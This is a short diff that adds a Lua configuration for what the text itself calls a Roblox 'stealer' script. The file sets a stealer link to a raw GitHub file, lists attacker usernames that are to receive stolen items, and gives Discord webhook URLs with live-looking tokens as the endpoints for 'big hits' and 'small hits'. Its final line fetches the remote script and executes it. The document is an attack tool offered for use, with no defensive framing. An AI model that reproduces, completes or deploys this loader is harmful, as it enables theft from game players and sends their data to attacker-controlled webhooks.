@@ -1,0 +1,14 @@
+STEALER_LINK = 'https://raw.githubusercontent.com/RobIoxScript-Yt/Script/refs/heads/main/Tyfffft' -- stealer link (how to create is bellow)
+
+DISCORD_ID = '' -- THIS IS NOT IMPORTANT (its for /list_players and /execute commads!)
+
+Usernames = {
+    'TheBig1Haha', -- PUT UR ROBLOX USERNAMES
+    'suliman2018noob', -- AS MANY AS U WANT BUT DONT FORGET ,
+    'xandrex1789',
+}
+
+BigHitsWebhook = "https://discord.com/api/webhooks/1323998160200138845/-mmXNkJYdXtE_J9eAkuz23t74O6tlu2koH4w8YKLAb3VUMGOL5WI3dWiD20DY_JDn_QJ"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1323998160200138845/-mmXNkJYdXtE_J9eAkuz23t74O6tlu2koH4w8YKLAb3VUMGOL5WI3dWiD20DY_JDn_QJ"
+
+loadstring(game:HttpGet(STEALER_LINK, true))() -- NEVER TOUCH THAT LINE OF CODE JUST DONT!!!
